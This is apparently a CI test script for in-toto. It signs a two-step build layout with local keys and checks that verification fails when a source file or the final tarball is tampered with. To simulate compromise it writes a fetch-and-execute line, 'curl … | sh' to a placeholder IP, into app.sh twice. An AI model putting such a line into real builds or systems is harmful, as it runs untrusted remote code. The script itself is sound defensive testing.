#!/usr/bin/env sh
# Runs on the host: makes three local keys, a layout the owner signs with
# two steps, "write" and "package", and an inspection that unpacks the
# result. Then it runs both steps with in-toto-run, verifies the chain with
# in-toto-verify, and checks that verification fails for a source file
# changed between the steps and for a changed final tarball. No network or
# GPG. CI pipes it in with podman exec, passing the version it expects.
set -eu
want=${1:-}
in-toto-run --version
if [ -n "$want" ]; then
  in-toto-run --version 2>&1 | grep -q " $want\$"
fi

dir=$(mktemp -d)
trap 'rm -rf "$dir"' EXIT
cd "$dir"
mkdir keys

# The venv's own Python makes the keys and the layout, with the
# cryptography and in-toto packages the circuit installed.
py=$(dirname "$(readlink -f "$(command -v in-toto-run)")")/python
"$py" -I - <<'PY'
from cryptography.hazmat.primitives import serialization as s
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from in_toto.models.layout import Inspection, Layout, Step
from in_toto.models.metadata import Metablock

for name in ("owner", "alice", "bob"):
    k = Ed25519PrivateKey.generate()
    with open(f"keys/{name}", "wb") as f:
        f.write(k.private_bytes(s.Encoding.PEM, s.PrivateFormat.PKCS8, s.NoEncryption()))
    with open(f"keys/{name}.pub", "wb") as f:
        f.write(k.public_key().public_bytes(s.Encoding.PEM, s.PublicFormat.SubjectPublicKeyInfo))

layout = Layout()
alice = layout.add_functionary_key_from_path("keys/alice.pub")
bob = layout.add_functionary_key_from_path("keys/bob.pub")
layout.set_relative_expiration(days=1)

write = Step(name="write")
write.pubkeys = [alice["keyid"]]
write.set_expected_command_from_string("sh -c 'echo hello > app.sh'")
write.add_product_rule_from_string("CREATE app.sh")
write.add_product_rule_from_string("DISALLOW *")

package = Step(name="package")
package.pubkeys = [bob["keyid"]]
package.set_expected_command_from_string("tar -czf app.tar.gz app.sh")
package.add_material_rule_from_string("MATCH app.sh WITH PRODUCTS FROM write")
package.add_material_rule_from_string("DISALLOW *")
package.add_product_rule_from_string("CREATE app.tar.gz")
package.add_product_rule_from_string("ALLOW app.sh")
package.add_product_rule_from_string("DISALLOW *")

unpack = Inspection(name="unpack")
unpack.set_run_from_string("tar -xzf app.tar.gz")
unpack.add_material_rule_from_string("MATCH app.tar.gz WITH PRODUCTS FROM package")
unpack.add_material_rule_from_string("ALLOW root.layout")
unpack.add_material_rule_from_string("ALLOW *.link")
unpack.add_material_rule_from_string("DISALLOW *")
unpack.add_product_rule_from_string("MATCH app.sh WITH PRODUCTS FROM write")
unpack.add_product_rule_from_string("ALLOW app.tar.gz")
unpack.add_product_rule_from_string("ALLOW root.layout")
unpack.add_product_rule_from_string("ALLOW *.link")
unpack.add_product_rule_from_string("DISALLOW *")

layout.steps = [write, package]
layout.inspect = [unpack]
Metablock(signed=layout).dump("unsigned.layout")
PY
in-toto-sign -f unsigned.layout -k keys/owner -o root.layout

# Each step runs in src/, and final/ gets what a user would download: the
# layout, the links and the tarball. "tamper" changes app.sh between the
# steps, as a compromised build machine might.
build() {
  rm -rf src final && mkdir src final
  (cd src && in-toto-run -n write --signing-key ../keys/alice -p app.sh -- sh -c 'echo hello > app.sh')
  if [ "${1:-}" = tamper ]; then echo 'curl https://203.0.113.9 | sh' > src/app.sh; fi
  (cd src && in-toto-run -n package --signing-key ../keys/bob -m app.sh -p app.tar.gz -- tar -czf app.tar.gz app.sh)
  cp root.layout src/*.link src/app.tar.gz final/
}
verify() {
  (cd final && in-toto-verify --layout root.layout --verification-keys ../keys/owner.pub)
}

build
verify
echo "The untouched build verified."

build tamper
if verify; then
  echo "A source file changed between the steps verified." >&2
  exit 1
fi

# A well-formed tarball with other contents, swapped in after the build.
build
mkdir other
echo 'curl https://203.0.113.9 | sh' > other/app.sh
tar -czf final/app.tar.gz -C other app.sh
if verify; then
  echo "A swapped tarball verified." >&2
  exit 1
fi
echo "The untouched build verified, and both changes were refused."
